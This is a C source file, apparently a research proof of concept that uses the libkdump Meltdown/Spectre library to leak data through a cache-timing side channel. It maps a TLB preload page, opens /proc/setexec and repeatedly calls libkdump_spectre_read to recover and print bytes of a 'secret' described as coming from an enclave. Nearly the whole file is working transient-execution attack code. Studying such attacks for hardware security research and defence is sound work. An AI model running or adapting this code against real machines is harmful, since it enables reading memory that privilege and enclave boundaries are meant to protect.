#include <stdio.h>
#include <string.h>
#include <assert.h>

# include <unistd.h>
# include <pwd.h>
# define MAX_PATH FILENAME_MAX

#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <sched.h> 
#include <fcntl.h>
#include <assert.h>

#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <sys/syscall.h>
#include <assert.h>
#include "libkdump.h"

#define USE_RDTSCP
#define CACHE_MISS_THRESHOLD 180

size_t dummy_secret[80] = {0x42 << 12, 0x4 << 12, 0, 0, 0, 0, 0, 0, 0x42 << 12, 0, 0, 0, 0, 0, 0, 0, 
					0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
					0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
					0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
					0x42 << 9, 0x4 << 9, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0};

uint64_t *pte_encl = NULL;
uint64_t *shadow_secret = NULL;
uint64_t *tlb_preload_page = NULL;

char buffer[300*4096];
int count[256];

int setexec = 0;

// ---------------------------------------------------------------------------
size_t secret;
size_t secret_shadow;

int read_secret_from_enclave(size_t shadow)
{
	int retries = 1;
	int i;
	int score[2] = {0, 0};
	uint8_t value[2] ={0, 0};
	unsigned status; 
	int monitor[3] = {4, 5, 0x47};

	while (retries--) {
		libkdump_spectre_read((size_t)dummy_secret, (size_t)dummy_secret, score, 
		  value, (size_t)tlb_preload_page, MELTDOWN_SEGMENT_STANDARD, CACHE_LEVEL_L1, TLB_PRESENT, 0x42);

		libkdump_spectre_read((size_t)dummy_secret, (size_t)dummy_secret, score, 
		  value, (size_t)tlb_preload_page, MELTDOWN_SEGMENT_DS, CACHE_LEVEL_L1, TLB_PRESENT, 0x0);
		
	}

	libkdump_spectre_result(score, value);
	return (score[0] > score[1]) ? value[0] : value[1];
}

/* Application entry */
int main(int argc, char *argv[])
{
	int i;
	setexec = open("/proc/setexec", O_WRONLY);
	assert(setexec >= 0);

	tlb_preload_page = (uint64_t *)mmap((void *)((((size_t)dummy_secret >> 12) << 12) + 0x1000), 
	  0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);
	assert(tlb_preload_page != MAP_FAILED);
	*(tlb_preload_page) = 0x65000;
	printf("mapped tlb_preload_page @%p\n", tlb_preload_page);
	
	libkdump_enable_debug(1);

	libkdump_config_t config;
	config = libkdump_get_autoconfig();
	if (argc > 2) {
		config.physical_offset = strtoull(argv[2], NULL, 0);
	}
	config.measurements = 1;
	config.retries = 100000;
	config.load_threads = 0;

	libkdump_init(config);
	libkdump_spectre_prepare(0, 0);
	
	for (i = 0; i < 256; i++)
		count[i] = 0;

	for (i = 0; i < 300*4096; i++)
		buffer[i] =0; 

	for (i = 0; i < 10; i++) {
		int value = read_secret_from_enclave((size_t)secret);
		printf("%c", value);
		fflush(stdout);
	}
	
	libkdump_cleanup();

	return 0;
}
